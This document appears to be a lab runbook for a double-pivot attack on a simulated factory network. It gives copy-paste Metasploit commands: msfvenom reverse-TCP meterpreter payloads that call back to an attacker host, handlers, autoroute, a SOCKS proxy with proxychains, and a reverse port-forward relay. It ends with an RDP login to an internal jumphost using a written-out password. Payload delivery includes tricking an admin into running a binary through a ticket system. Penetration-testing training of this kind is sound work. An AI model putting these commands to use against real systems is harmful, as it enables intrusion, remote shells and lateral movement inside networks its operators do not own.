# Double-Pivot Runbook: External → STAFF1 → ADMIN → RDP Jumphost

Reproducible command sequence for the factory-network pivot lab. All commands
manual — no resource scripts. Runs a reverse TCP foothold on STAFF1 (vmbr1),
relays a second payload to ADMIN (dual-homed vmbr1/vmbr2), chains routes through
both, and RDPs into the Ubuntu jumphost on vmbr2 — all through a single SOCKS proxy.

> Copy top to bottom. Placeholders in `<angle brackets>` — swap for your lab values.

---

## Topology

```
Kali (vmbr5, 192.168.200.2)
  └─ STAFF1  [session 1]  vmbr1 192.168.0.0/24   (dual-homed .4 / .108)
       └─ ADMIN  [session 2, relayed via STAFF1]  dual-homed:
            ├─ vmbr1  192.168.0.x
            └─ vmbr2  192.168.100.x             ← RDP jumphost lives here
                 └─ Ubuntu RDP box  192.168.100.3
```

Kali is able to communicate with staff one externally through the use of a fake public ip range of 192.168.200.x
Assume that 192.168.200.x is a public ip, similar to your home network.

---

## Lab values (fill in first)

| Name           | Value              | Notes                                  |
|----------------|--------------------|----------------------------------------|
| Kali IP        | `192.168.200.2`      | LHOST for hop 1; where shells land     |
| STAFF1 vmbr1   | `192.168.0.103`    | LHOST for hop 2 (relay target)         |
| Handler port 1 | `4444`             | STAFF1 callback                        |
| Handler port 2 | `4445`             | ADMIN callback (relayed)               |
| vmbr1 subnet   | `192.168.0.0/24`   | route via session 1                    |
| vmbr2 subnet   | `192.168.100.0/24`   | route via session 2 — read off ADMIN   |
| Jumphost       | `192.168.100.3`      | RDP target on vmbr2                     |

Confirm Kali's IP: `ip a`

---

## HOP 1 — Foothold on STAFF1

### 1. Generate the Windows payload
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.200.2 LPORT=4444 \
  -f exe -o payload.exe
```

### 2. Start msfconsole and the handler
```bash
msfconsole -q
```
Then inside msfconsole:
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.200.2
set LPORT 4444
set ExitOnSession false
exploit -j
```
`-j` backgrounds the handler so the console stays usable.

### 3. Deliver and detonate
Get `payload.exe` onto STAFF1 (shared folder / `python3 -m http.server`) and run
it. Watch for:
```
[*] Meterpreter session 1 opened (192.168.200.2:4444 -> 192.168.200.4:xxxxx)
```
Confirm the session:
```
sessions -l
```

### 4. Add the vmbr1 route (from inside the session)
```
sessions -i 1
run autoroute -s 192.168.0.0/24
run autoroute -p          # confirm: 192.168.0.0/24 -> Session 1
background
```

### 5. Start ONE SOCKS proxy
```
jobs -K                   # clear any duplicate first — critical
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run -j
jobs                      # confirm socks_proxy is listed
```
Verify the listener in a Kali terminal:
```bash
ss -lntp | grep 1080
```

### 6. Point proxychains at it (one-time config)
Edit `/etc/proxychains4.conf`:
- Under `[ProxyList]`, one active line: `socks4 127.0.0.1 1080`
- Comment out the default Tor line: `# socks4 127.0.0.1 9050`
- `dynamic_chain` uncommented, `strict_chain` commented
- Comment out `quiet_mode` to see per-hop output

### 7. Test hop 1
```bash
proxychains nmap 192.168.0.*
proxychains curl http://<internal-web-ip>
```

---

## HOP 2 — Relay to ADMIN

ADMIN can't reach Kali, so its shell calls back to STAFF1, which relays to Kali.

### 1. Build the reverse relay on STAFF1
```
sessions -i 1
portfwd add -R -l 4445 -L 192.168.200.2 -p 4445
portfwd list              # confirm exactly one entry -> 192.168.200.2:4445
background
```
Flags: `-R` reverse relay · `-l 4445` port STAFF1 opens · `-L 192.168.200.2`
forward destination (Kali) · `-p 4445` Kali's port.

### 2. Start the second handler (Linux payload, new port)
```
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.200.2
set LPORT 4445
set ExitOnSession false
exploit -j
```

### 3. Generate ADMIN's payload — LHOST = STAFF1
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.0.103 LPORT=4445 \
  -f elf -o payload_admin.elf
```
LHOST is **STAFF1** (`.103`), because ADMIN calls back to STAFF1, which relays.

### 4. Deliver via the ticket system → ADMIN runs it
```bash
chmod +x payload_admin.elf
./payload_admin.elf
```

### 5. Confirm session 2 is really ADMIN
```
sessions -i 2
sysinfo                   # hostname must be ADMIN, not STAFF1
ifconfig                  # expect TWO NICs: vmbr1 (192.168.0.x) + vmbr2
```
> Relayed sessions may show a `127.0.0.1` / STAFF1 source — normal. Verify by
> `sysinfo` hostname and the second NIC, not the connection IP.

---

## HOP 3 — Route to vmbr2 and RDP

### 1. Add the vmbr2 route through ADMIN (session 2)
```
run autoroute -s 192.168.100.0/24
run autoroute -p          # now shows TWO routes: vmbr1 via S1, vmbr2 via S2
background
```

### 2. Proxy still carries both hops
```
jobs                      # socks_proxy still on 1080 — no second proxy needed
```

### 3. Find the RDP host on vmbr2
```bash
proxychains nmap -sT -Pn -n -p 3389 192.168.100.3
```
Want `3389/tcp open`.

### 4. RDP through the full chain
```bash
proxychains xfreerdp /v:<ubuntu-ip> /u:<user> /p:<pass> \
  /cert:ignore +clipboard /dynamic-resolution

proxychains xfreerdp /v:192.168.100.3 /u:<user> /p:JumpH0st2026! \
  /cert:ignore +clipboard /dynamic-resolution
```
Install if missing: `sudo apt install freerdp2-x11`. Expect it to be sluggish
over a double SOCKS pivot — normal for a demo.

---
